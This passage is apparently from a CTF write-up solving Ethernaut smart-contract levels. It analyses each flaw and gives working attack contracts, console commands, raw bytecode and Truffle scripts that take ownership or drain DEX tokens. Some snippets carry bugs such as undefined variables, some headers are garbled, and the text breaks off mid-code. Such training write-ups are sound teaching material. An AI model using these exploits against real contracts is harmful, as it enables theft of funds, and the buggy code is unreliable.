And all we need is to make the isLastFloor function returns false at first so we get inside the if block and true to set top.

-----
**Exploitation**

```js
interface Elevator { 
 function goTo(uint _floor) external;
}

contract EvilBuilding { 
    uint count= 0; 
    function isLastFloor(uint) external returns (bool){ 
        count ++ ; 
        return count%2==0 ? true : false; // The first time will pass false the second true
    }

    function callAttack(address ElevatorAddress) public {
        Elevator elevatorContract = Elevator(ElevatorAddress);
        elevator.goTo(10); // put any number here really
    }
}
```

Challenge solved ✅

## Privacy

**Challenge description**

The creator of this contract was careful enough to protect the sensitive areas of its storage.
Unlock this contract to beat the level.

--------
**Analysis**

![Privacy storage](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/ff541ef577bf0b185d9bd2266bc82b7cef5b80e9c30195d89a0ba04fb1f9e21e_sfqspe.png)  

As we said before, every variable in the storage can be accessed all we have to do is find which slot it&#x27;s residing in. Same applies here.

We got the following:

```js
// [0] bool locked
// [1] uint256 ID
// [2]      awkwardness | denomination | flattening
// arrays start always in a new slot 
// [3] bytes32 data[0]
// [4] bytes32 data[1]
// [5] bytes32 data[2]
```

-----
**Exploitation**

We know the position of the password . We can unlock the contract. 

```js
await contract.getStorageAt(INSTANCE_ADDRESS,5);
/// We can manually extract the least significant 16 bytes or simply write a util contract like below
```

```js
contract Utils { 
    function get16Bytes(bytes32 value) public returns (bytes16) {
        return bytes16(value);
    }
}
```

```js
await contract.unlock(Returned_Value);
```

Challenge solved ✅

## Gatekeeper One

This challenge gave me hard time, two days to solve it but I learnt a lot during those days.

**Challenge description**

Make it past the gatekeeper and register as an entrant to pass this level.

--------
**Analysis**

Okay so we got three modifiers, each one represents a `barrier` we need to break through. I will be going through each modifier one by one.

#### gateOne

Looking to this gate it sounds really familiar

![GatekeeperOne gateOne](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/06809c8478417e00449644e9239e81acbb43073a701381acb4adf9097c50552e_eyyyd2.png)  

It implies that we should be using another contract to interact with the gate.

#### gateThree

I will leave gateTwo the last one as it&#x27;s the most annoying ( not hard ) one to pass.

![GatekeeperOne gateOne](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138021/556142b2c2f87864fc6a219ce8393b52105c58b94b119105918d8c8c543abd1a_bg3gdk.png)  

We got three conditions to pass and lot of type conversion 🙂.It&#x27;s time we learn how conversions works in solidity [Solidity Type conversions](https://docs.soliditylang.org/en/v0.6.0/types.html?highlight=conversions#explicit-conversions)

Let&#x27;s go through each condition one by one

1. First condition

```js
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);
```

Let&#x27;s say uint64(_gateKey) = 0x???????????????? and now we neeed to find the bytes we have 

*uint16 == uint32* which translates to 0x0000AAAA== 0xAAAA. =&gt; uint64(_gateKey) = 0x????????0000AAAA

2. Second Condition

```js
require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);
```

**uint32 != uint64 `` which translated to 0x????????0000AAAA != 0x0000AAAA ( the value we found in condition 1 ) so here we need make sure the `?` are different than zeros.

3. Last condition

```js
require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);
```

It just tells us that the `AAAAA` should be derived from the `tx.origin` value.

Okay to sum it up we have the format of `0xFFFFFFFF0000FFFF` for our contract. so we can get the values by using a logical operator `&amp;`.

#### gateTwo

![Gateekeeper gateTwo](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/ed529917c8ae75cb2c5878f6bd67665021b8843e8d04305cf5556944dd3a45bf_f9rwex.png)  

what is the `gasleft` function ?
the gasleft function tells us how much gas is left. As we know each transaction needs a certain amount of gas that we pay for. But do you know how the amount of gas if calculated ?
we can check the website [Opcodes, EVM](https://www.ethervm.io/), actually each opcode has its fixed consumption of gas. We are here determined to get the value of the gasleft when we arrive at the condition and make sure it can be divided by that number.

-----

**Exploitation**

1. We should call the contract from our `Evil Contract` so we bypass the first gate
2. We should make sure the key adhere to the key format we found.
3. We need to pass a gas value that passes the condition.
    &gt; However when searching for that gas value we can
        1. Calculate the gas consumed till the call of the condition check by using the debugger by summing the cost of opcodes :)
        2. Use the debugger to check the gas value at the condition check.
        3. Just don&#x27;t, if you are impatient brute force it. That&#x27;s what I did when I got low on caffeine and the music stopped.

![Debugging interface](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138017/18f23b5aad25da24fa6fbdc8842fb1ee0568daa3ac723a166802b0cc2dd2518d_yg3ech.png)  

So here is the final contract

```js
contract EvilContract { 
    function getKey() view public returns (bytes8){ 
        return bytes8(uint64(uint160(tx.origin))) &amp; 0xFFFFFFFF0000FFFF; // The first time will pass false the second true
    }
    function callAttack(address gateAddress, uint baseGasValue) public returns (bool) {
        bytes8 gateKey = getKey();
        uint i;

        for (i=0;i&lt;300;i++)
        {
        (bool result,) =  gateAddress.call{gas:gasValue}(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, baseGasValue+100+8191*4));
        if(result) return result;
        }
        return false;
    }
}
```

Happy hacking ! You may rest traveler , The next gate will be some kind of a boss fight.

Challenge solved ✅

## GateKeeper Two

&gt; Time to delve deep in the ethereum blockchain

**Challenge description**

I will sum up we need to pass the gate and learn many things.

--------
**Analysis**

As usual here we got three modifiers to pass. We will be going through each modifer one by one from the easiest to the hardest.

![Gatekeeper contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/193982e4a19ec767e0759ab2e9adc2e16865502b0625e6eb22fc0a39e11418d7_k0ahq6.png)  

#### GateOne

```js
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
```

Okay we need to call the `GatekeeperTwo` from another contract.

#### GateTwo

```js
modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }
```

Oww a new keyword `assembly` what&#x27;s that ? 
![Solidity Documentation Screenshot - assembly keyword](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138017/2cb6f44375d3fb1a39d4e147414218e8f9d1b7fe5a98c873c4469082b7fba674_qlucds.png)  

So we have now a clear idea of the assembly keyowrd and it&#x27;s capabilities, that might remind you a little bit of how the `C` language works ! 
For the `extcodesize` the code snippet below taken from the docs explains it all.

```js
// retrieve the size of the code, this needs assembly
            let size := extcodesize(addr)
```

For the `caller()` it returns the address of the caller. it might be an account or another contract. Actually, this `consensys` which a great resource for smart contract security explains it all .

&gt; the idea is straightforward: if an address contains code, it&#x27;s not an EOA but a contract account. However, a contract does not have source code available during construction. This means that while the constructor is running, it can make calls to other contracts, but extcodesize for its address returns zero.

[Consensys Page](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/)

So we now know to pass this gate we need to call the method `enter` in the constructor of our *EvilContract*

### gateThree

This gate resembles gateThree of *GateKeeper One* it&#x27;s about performing the right logical operations and finding the gateKey.

```js
 modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }
```

Let&#x27;s evalulate the *right* side of the equality. Remember the *Token* Challenge ? yes but now this dangerous manipulation of unsigned integer in intended and it gives us the value `0xFFFFFFFF`.
For the *left* side of the equality we got an **XOR** operation. **XOR** verifies if the bits in the same position or not if they are it results in 1 otherwise in 0. Let&#x27;s ignore the conversion it won&#x27;t change anything actually because we can reverse it to get the _gateKey later.

So the equation we have : 

**A** =  `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`
**B** = `uint64(_gateKey)`
**C** = `uint64(0) - 1`

Here is what we need to do ! Read carefully this wikipedia page if you need to understand how it works on bit level. [Wikipidea XOR Article](https://en.wikipedia.org/wiki/XOR_cipher)
![XOR Wikipedia Screenshot](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/01a9f0d0791a8896c4b6109abc576acbfbccade8b44817fa1abd2f245eb99700_lii5bn.png)  

`A ^ B = C , B = ? ==&gt; B = A ^ C`
Which translates to
`gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1);`

-----
**Exploitation**

Let&#x27;s craft our *EvilContract*

```js
contract EvilContract { 

    function getOperationResult() public pure returns (uint64){
        uint64 x =0; 
        return x - 1;
    }

   function getGateKey() public view returns (bytes8){ 
       uint64 x = getOperationResult();
     return   bytes8(x ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
   }

   
   constructor(address gateAddress) public {
       GateTwo gateTwoContract= GateTwo(gateAddress);
       bytes8  gateKey =getGateKey();
      bool state= gateTwoContract.enter(gateKey);
     require(state);
   }
   
}
```

We pass our instance address to the constructor.

Challenge solved ✅

&gt; I was late, I couldn&#x27;t join theCyber club 🥲

## Naught Coin

&gt; RTFM

**Challenge description**

NaughtCoin is an ERC20 token and you&#x27;re already holding all of them. The catch is that you&#x27;ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.
~ A bunch of useful references we will be going through in analysis

--------

**Analysis**

![Naught Coin contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/264f925aeaf5e08d9758746a1f9774a6a2194df257f8dd0a92a00b4b820881d7_dm5hut.png)  

The contract is an implementation of the ERC20 specification.

*How it works ?*
We create tokens that can be traded between the users of our contract. Our contract is responsible for setting the total supply and modifying it, keeping track of users balance and one other useful feature allowing and disallowing the ones who can spend/trade tokens from each account remember that it will be useful.

The logic is flawless and the condition cannot be bypassed.

```js
      require(now &gt; timeLock);
```

But our contract is inheriting from the ERC20 of openzeppelin and we can see something is wrong.

![ERC20 openzeppeling](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138012/1ec4088e0ffadccfa057b1c022c8d4fb51d1475ef0e0018a4e32b7b1beab92e0_iagggl.png)  

We got another method for transferring tokens ! cool but wait *he caller must have allowance for ``from``&#x27;s tokens of at least amount* so msg.sender needs to have an allowance of the amount.
and allowance can be set by calling..

![ERC20 openzeppelin](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/47b72aa9c7060cd02c197e1de9e50fb4f53f3b5a7d7e6e9f0c946807ec700df9_gsugja.png)  

Okay we got everything let&#x27;s -----
**Exploitation** it

**Further Reading** [ERC20 API: An Attack Vector on Approve/TransferFrom Methods](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit#)

-----
**Exploitation**

```js
const balance = (await contract.balanceOf(player)).toString();
await contract.approve(player,balance);
await contract.transferFrom(player,ANY_OTHER_ADDRESS,balance);
```

Challenge solved ✅

## Perservation

**Challenge description**

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.
The goal of this level is for you to claim ownership of the instance you are given.

--------
**Analysis**

I explained well the `delegateCall` function before and how it runs in the caller context but I left the context a little blurry so let&#x27;s define it.
The context here is the storage variables or let me call them `state variables` they are defined in the contract address and the called contract will handle them *blindly* which means he will assume that

*Storage layout of the caller*  == *Storage layout of the callee*

Let&#x27;s look to our contract now.

![Perservation contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/0cded2638e39c98dee9e35690675e5a299c3628f81c9bdb1375a708b5e209098_ecu1g4.png)  

The interesting bits are : 

```js
  //inside the library contract
  uint storedTime;  

   function setTime(uint _time) public {
    storedTime = _time;
  }
```

```js
 // inside the vulnerable contract
 address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
```

I guess you got an idea what will happens with the delegateCall ? `storedTime` is actually our `timeZone1Library` variable they are both at `slot[0]` of the storage so it will be set instead. 
and the `setSecondTime` does the same thing as the `setFirstTime` in this case.

-----
**Exploitation**

1. Create an evil contract that implements `setTime(uint)` and has the same storage layout as the vulnerable contract ( by declaring the same variables in the same order 😄)
2. call the `set_X_Time` of the vulnerable contract by passing uint(evilcontractAddress) as paramater
3. call the method again now our evilContract function will be triggered to set owner = ourAccount;

Let&#x27;s craft the *EvilContract*

```js
contract EvilContract {

  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  
  // These variable are useless because we won&#x27;t to ensure that the owner is in slot[2] 
  // we don&#x27;t really care about the slots that comes after
  uint storedTime;
  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));

   function setTime(uint _time) public {
    owner = 0x84e7a3679A82C2766Ff8382862ab883FF9460307;
   }

   function getParam() view public returns (uint){
        return uint(address(this));
   }
}
```

Challenge solved ✅

**Further Reading** [Preventing Smart Contract Attacks on Ethereum — “DELEGATECALL”](https://betterprogramming.pub/preventing-smart-contract-attacks-on-ethereum-delegatecall-e864d0042188)

## Recovery

&gt; Forensics in the blockchain world !

**Challenge description**

A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.

--------
**Analysis**

**the problem**

```js
    new SimpleToken(_name, msg.sender, _initialSupply);
```

&gt; A contract can create other contracts using the new keyword. The full code of the contract being created has to be known when the creating contract is compiled so recursive creation-dependencies are not possible.

[Solidity Docs - New keyword](https://docs.soliditylang.org/en/v0.8.15/control-structures.html?highlight=new%20keyword#creating-contracts-via-new)

the `new` keyword returns the address of the created contract but here it&#x27;s not saved and there is no way to retrieve it from the contract state. But we are in the blockchain world where transparency rules ! All transactions are saved and we can actually find the created contract.

-----
**Exploitation**

1. Go to [Etherscan](https://rinkeby.etherscan.io/)
2. Search for your instance address
3. You will find something similar to this, click it !
![Recovery instance contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/93668187b141f813b187b92cf0e33ff963269e40cd11b36386300e201af120c9_atmryc.png)  

4. Check the balance to be sure that it&#x27;s the created contract.

 ![Recovery created contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/106328b15039a3d164b45720563251c6f628e2907732a9b997514327aac3f457_vnq6mh.png)  

6. call the destroy function with your wallet address as paramater

Here is a simple contract to call the destroy function :

```js
interface SimpleToken {
      function destroy(address payable _to) external ; 
}

contract Recover {

    function recoverFunds(address contractAddress, address payable myAddress) public {
        //  (bool success, ) = contractAddress.call(
        //     abi.encodeWithSignature(&quot;destroy(address payable)&quot;, myAddress));
        //  require(success);   

        // or a cleaner way 
        SimpleToken tokenContract = SimpleToken(contractAddress);
        tokenContract.destroy(myAddress);
    }

    function verifyBalance(address contractAddress) public view returns (uint){
        return contractAddress.balance;
    }
}
```

## Magic Number

**Challenge description**

&gt; To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number.
Easy right? Well... there&#x27;s a catch.
The solver&#x27;s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin&#x27; really really itty-bitty tiny: 10 opcodes at most.

--------
**Analysis** 

Writing Opcode instead of plain solidity.  **It&#x27;s not that hard right ?** *right?* 
Okay Let&#x27;s dive in one by one till we understand how everything works. I  will be writing some pseudo/solidity code for analogy.

```js
//
function whatIsTheMeaningOfLife(){
    return 42;
}

```

`a contract that responds to whatIsTheMeaningOfLife()` fallback function can answer that so let&#x27;s make things more simple

```js
function(){
    return 42;
}
```

Let&#x27;s translate it line by line to opcode. I found this magnificent reference [EtherVM](https://www.ethervm.io/#02). I really like the table view instead of navigating page by page through the [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf).

```js
return 42; 
---------   
PUSH1 0x42 //  our value
PUSH1 0x80 //  memory position
MSTORE // stores the 42 into memory location 0x80
PUSH1 0x20 // the length of the value
PUSH1 0x80 // memory position ( again )
RETURN // returns (memory position , offset )  so we can calculate memoryPos+offset to get the value !

// *10 bytes total*
```

`PUSH1 VALUE` pushes a 1-byte value onto the stack.
`MSTORE` writes a (u)int256 to memory takes (offset,value) as args

&gt; The ethereum evm is a [Stack Machine](https://en.wikipedia.org/wiki/Stack_machine). args comes from the stack and return values are written into the stack.

&gt; In fact, Solidity uses the memory area between address zero and address 0x7F for internal purposes, and stores data starting at address 0x80. So initially, free memory starts at 0x80. To keep track of which memory can still be used and which memory areas are already in use [A deep-dive into Solidity – contract creation and the init code](https://leftasexercise.com/2021/09/05/a-deep-dive-into-solidity-contract-creation-and-the-init-code/)

Now we have to write opcodes for contract initialization. We should know how contract initialization works under the hood. First the bytes sent in the transaction can be divided into two *initialization opcodes* and *runtime opcodes*. The *initialization opcodes* are the one responsible for the creation of the contract by executing the constructor and copying the *runtime opcodes* into the memory because the *runtime opcodes* is the instruction that will be run in the contract (functions,modifiers etc). What we have defined above is the *runtime opcodes*. Let&#x27;s define our *initilization opcodes*

```js
// copy the runtime code into memory with codecopy(length,offset,dest)
PUSH 0x0a // 10 bytes of runtime opcodes
PUSH 0x0c // 13 bytes of initialization opcodes ( I didn&#x27;t guess it I have actually calculated after writing the whole thing )
PUSH 0x00 // memory offset
CODECOPY

// the initialization will stop at STOP or RETURN. for our case I will return the offset + length of the runtime code
PUSH 0x0a 
PUSH 0x00
RETURN
```

-----
**Exploitation**

To craft our payload we will convert the instruction to pure bytes. That&#x27;s fairly easy. We view [EtherVM](https://www.ethervm.io/#02) to view the bytes of each instruction and for the values we discard the `0x` (`0x0a` =&gt; `0a`)

                       [ Initialization bytes    |    Runtime bytes ]
So our final payload : `600a600c600039600a6000f3604260805260206080f3`

We open the console to create our contract and set it as the solver.

```js
const tx = await web3.eth.sendTransaction({from:player,data:&#x27;600a600c600039600a6000f3604260805260206080f3&#x27;});
await contract.setSolver(tx.contractAddress);
```

Challenge solved ✅

## Alien Codex

**Challenge description**

You&#x27;ve uncovered an Alien contract. Claim ownership to complete the level.

    Understanding how array storage works
    Understanding ABI specifications
    Using a very underhanded approach

--------
**Analysis**

First look at the contract code nothing comes to my mind. The Ownable contract is actually `openzeppelin` Ownable and I looked into its source code and the only useful thing I got is it saves `address owner`.

 Looking back to the challenge description I noticed the array in storage part. Dynamic structures have a length property that takes a normal position in the stack and from it we can look for the array data in the stack. We have to use `keccack265(length_position)` to find the first slot of array data.

So how can we -----
**Exploitation** that ?

![Alien Codex method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138017/86f1f291d81ff664dbe3c9afd11c315bb31de2e0a3283a0f8d964b43e9bf44eb_tcxxpp.png)  

We got 2 slots taken from the whole storage. If we make the length of the array takes up the whole storage then we can overwrite any value of it. `retract` allows that, the `array.length` is `uint256`. 

After taking up the whole storage we need to find the position of the owner variable.
Our current storage layout is.

```js
/* STORAGE
* [0]: contract + owner , 
* [1]: codex
* keccak256(1) : codex[0]
*       ..
*        ..
* [2^256]: 0x000000000
*/
```

We want to overlap and get to slot[0] to set it. We can calculate the index of that element by `2^256 - keccack(256)(1) +1`

-----
**Exploitation**

first we call the `retract` to set the array length to max.

```js
await contract.retract()
```

then we get our payload, here is a utils contract.

```js
contract Utils { 

    function getNumber() public pure returns (uint256){
      uint256 x =0;
        
        // return x-1 - uint256(keccak256(abi.encodePacked(uint256(1))))+1;
        
        return x - uint256(keccak256(abi.encodePacked(uint256(1))));
    }
}
```

We check if we got it right 😄

![Alien Codex - check](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/03ed7019523687b6195b1e2824212ccf9c27300ff053773c2f5b93ea5b79580d_boj4jy.png)  

no need to be puzzled we know what it is it&#x27;s the contact value + 

![Alien Codex - Level address](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138013/9faab8cbd57b86461622fa7e3aad8dab64aed6c6d4a52a4ee19088857b840d21_pzx1am.png)  

So our payload should be 

```Js
0x00000000000000000000000184e7a3679A82C2766Ff8382862ab883FF9460307
0x000000000000000000000001YOUR_ADDRESS_HERE
```

Challenge solved ✅

## Denial

&gt; There is a way to using `addr.call{value:x}(&quot;&quot;)`, only that it forwards all remaining gas and opens up the ability to perform more expensive actions ( and it returns a failure code instead of propagating the error )  ~ Solidity docs

That&#x27;s all we need. So I lost quite bit of time looking for a way to reach the call stack depth limit ( which is 1024 ). But it was more the hard way of doing things.  What if we didn&#x27;t leave the caller contract enough gas to transfer the 1% of the owner ? Yes that&#x27;s really it !

-----
**-----
**Exploitation**ation**

Our evil contract, btw don&#x27;t try to run it on Remix as it will crash instead use truffle console or something similar to try it 

```js
contract EvilContract { 
    receive() external payable {
        while(true);  // the line that crashed my whole VM
    }
}
```

Challenge solved ✅
 
 &gt; This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.
If you are using a low level call to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example call.gas(100000).value().

Typically one should follow the checks-effects-interactions pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

Note: An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.


## Shop

```js
interface Shop {

  function buy()  external ;
  function isSold()  external view returns (bool) ;
  }

contract EvilContract { 
    address victimAddress;
    Shop shopContract;

    function setVictimAddress( address _victimAddress) public { 
        victimAddress= _victimAddress;
        shopContract = Shop(_victimAddress);
    }

    function price() external view returns (uint){
        return shopContract.isSold()?0:100;
    }

    function buy() public {
        shopContract.buy();
    }
}
```

## Dex

`This challenge and it&#x27;s second version will have the same solution basically with a little tweak. Better understand the concept`

**Challenge description**

&gt;The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.
You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.
You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a &quot;bad&quot; price of the assets.

--------
**Analysis**

The logic is faultless or is it ?  Well to be honest had to try many things here. One thing that got my attention that the equation made to calculate the swap_amount was familiar but not that much

![Dex Equation](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138013/17dcc969cfc52464829cb1a88231824931fda3a5b0d0b1d3d446eaf763974942_xxpfji.png)

A good read to understand it [Amazing Article to understand AMM](https://www.gemini.com/cryptopedia/amm-what-are-automated-market-makers).

So actually by balancing our token balance from one token to another we will manage at last to drain the contract&#x27;s balance of one token&#x27;s type.

-----
**-----
**Exploitation**ation**

```js
const contractABI = artifacts.require(&quot;Dex&quot;);

// if token1.balance &gt; token2.balance ==&gt; token2 is more expensive because it has less tokens
// we want to trade the most expensive tokens
// knowTokenValues() ==&gt; Distiniguishing the most expensive and cheapest token
// getSwapValues() // Basically our balance in the most expensive token
// ==============================

let contract ;
const TOKEN1_ADDRESS = &quot;0x954aB18d300D8FFE76a2eFE7B36fcD6EF36825c7&quot;;
const TOKEN2_ADDRESS = &quot;0xE651aD37ac31B03F7B49036248A29DC75D0093E6&quot;;
let PLAYER=&#x27;PLAYER_ADDRESS&#x27;

async function getBalances(){
    const token1Balance = (await contract.balanceOf(TOKEN1_ADDRESS,contract.address)).toNumber();
    const token2Balance = (await contract.balanceOf(TOKEN2_ADDRESS,contract.address)).toNumber();
    console.log(`Current Balances for contract : A : ${token1Balance} \t B : ${token2Balance}`);
    return {token1Balance,token2Balance}
}

 function knowTokenValues({token1Balance,token2Balance}){
    return {mostExpensiveToken: token1Balance &gt;= token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS,cheapestToken:token1Balance &lt; token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS };
}

async function getSwapValues(tokensWithValues){
    let toSwap  = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,PLAYER)).toNumber();
    let available = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,contract.address)).toNumber();

    // to be able to drain the funds and not stop when we got too much tokens.
    if(toSwap&gt;available)toSwap=available;

    return toSwap;
}


async function drainFunds(){
    
    let flag=true; // check condition

    // approving otherwise you will get an error due to how ERC20 works.
    await contract.approve(contract.address,10000,{from:PLAYER});

    while(flag){
        const balances = await getBalances();
        const tokenValues =  knowTokenValues(balances);
        const toSwap = await getSwapValues(tokenValues);
        await contract.swap(tokenValues.mostExpensiveToken,tokenValues.cheapestToken,toSwap,{from:PLAYER});
        console.log(`swapped ${toSwap} ${tokenValues.mostExpensiveToken} for  ${tokenValues.cheapestToken}`);

        flag = token1Balance*token2Balance&gt;0;
    }
    
    console.log(&quot;Hacked !&quot;)
}


module.exports = async  function(deployer) {
  
  contract = await contractABI.at(&quot;0xBa71E2eEF0D68C5aBCDe6dF3EEf9377b9eD9E78C&quot;); 
  await drainFunds();
};
```

![Dex console](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138023/852281f645c829a2d76b966618bbb6c25f1c4721506ecca9de0e7e6ef4fab42f_dw1jen.png)  

## Dex 2

## Challenge Description

Same as Dex v1 but now we need to drain both tokens.

--------
**Analysis**

Same here but we got one less check that makes it possible to inject a third token and thus draining both contract&#x27;s main tokens&#x27; balance.

![Dex 2 Function](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/aeb9bb0ecc92f4b707acbc9170c3bd3355c4361d3523704a799bc8717093366d_ogt3sr.png)  

-----
**-----
**Exploitation**ation**

```js
const contractABI = artifacts.require(&quot;Dex&quot;);

let contract ;
let TOKEN1_ADDRESS = &quot;0x954aB18d300D8FFE76a2eFE7B36fcD6EF36825c7&quot;;
let TOKEN2_ADDRESS = &quot;0xE651aD37ac31B03F7B49036248A29DC75D0093E6&quot;;

const TOKEN3_ADDRESS= &quot;0xfe5A0de02e7c76f2A51e3d297e65ccE784787538&quot;

let PLAYER=&#x27;0x84e7a3679A82C2766Ff8382862ab883FF9460307&#x27;

async function getBalances(){
    const token1Balance = (await contract.balanceOf(TOKEN1_ADDRESS,contract.address)).toNumber();
    const token2Balance = (await contract.balanceOf(TOKEN2_ADDRESS,contract.address)).toNumber();
    console.log(`Current Balances for contract : A : ${token1Balance} \t B : ${token2Balance}`);
    return {token1Balance,token2Balance}
}

async function knowTokenValues({token1Balance,token2Balance}){
    return {mostExpensiveToken: token1Balance &gt;= token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS,cheapestToken:token1Balance &lt; token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS };
}

async function getSwapValues(tokensWithValues){
    let toSwap  = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,PLAYER)).toNumber();
    let available = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,contract.address)).toNumber();

    // making sure at the end when we get most of balance in one token type we can still get the rest of the tokens.
    if(toSwap&gt;available)toSwap=available;

    return toSwap;
}


async function drainFunds(){
    
    let flag=true;
    await contract.approve(contract.address,10000,{from:PLAYER});
    while(flag){
        const balances= await getBalances();
        const tokenValues= await knowTokenValues(balances);
        const toSwap = await getSwapValues(tokenValues);
        await contract.swap(tokenValues.mostExpensiveToken,tokenValues.cheapestToken,toSwap,{from:PLAYER});
        console.log(`swapped ${toSwap} ${tokenValues.mostExpensiveToken} for  ${tokenValues.cheapestToken}`);
flag = balances.token1Balance*balances.token2Balance&gt;0;
    }
    // Token2 balance  = 0. Make sure to set the token3 value to the same value as token1 at the end of this loop.

    flag = true;
     TOKEN2_ADDRESS=TOKEN1_ADDRESS;
     TOKEN1_ADDRESS=TOKEN3_ADDRESS;

while(flag){
        const balances= await getBalances();
        const tokenValues= await knowTokenValues(balances);
        const toSwap = await getSwapValues(tokenValues);
        await contract.swap(tokenValues.mostExpensiveToken,tokenValues.cheapestToken,toSwap,{from:PLAYER});
        console.log(`swapped ${toSwap} ${tokenValues.mostExpensiveToken} for  ${tokenValues.cheapestToken}`);

        flag = balances.token1Balance*balances.token2Balance&gt;0;
    }
    
    console.log(&quot;Hacked !&quot;)
}


module.exports = async  function() {
  
  contract = await contractABI.at(&quot;0x5b9777555BDC7bA0Dee12EBB6d0Fc1E6Dc83b20a&quot;); 
  await drainFunds();
}
```

#### Solidity Contract for test and for the token3

Make sure to add a reasonable balance to the instance.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol&quot;;
import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol&quot;;

contract SwappableToken is ERC20 {

  constructor( string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    super._approve(owner, spender, amount);
  }
}

// transfer(instanceAddress,ValueYouWant)
```

## PuzzleWallet

**Challenge description**

&gt; The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.
&gt; Little did they know, their lunch money was at risk…
  You&#x27;ll need to hijack this wallet to become the admin of the proxy.
  Things that might help::
    Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.
    Knowing about proxy patterns and the way they handle storage variables.

--------
**Analysis**

We all know that smart contracts code is immutable. Once the smart contract is deployed it cannot be changed that&#x27;s why companies are spending thousands of dollars to make sure that the smart contract is faultless before deployment. Proxies are on the other hand a way to make smart contracts seem upgradable. By adding a new layer in the form of contract we can now which version accepts incoming calls. The code is long and It took me quite a while to get a grasp of it. So I will be highlighting the most interesting parts

```js
contract PuzzleProxy is UpgradeableProxy {
    // Getting to know the storage&#x27;s layout of our contract
    address public pendingAdmin;
    address public admin;
    ...

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    ...

    contract PuzzleWallet {
        // PuzzleWallet storage&#x27;s layout
    using SafeMath for uint256;
    address public owner;
    ...

        modifier onlyWhitelisted {
           require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);
            _;
        }

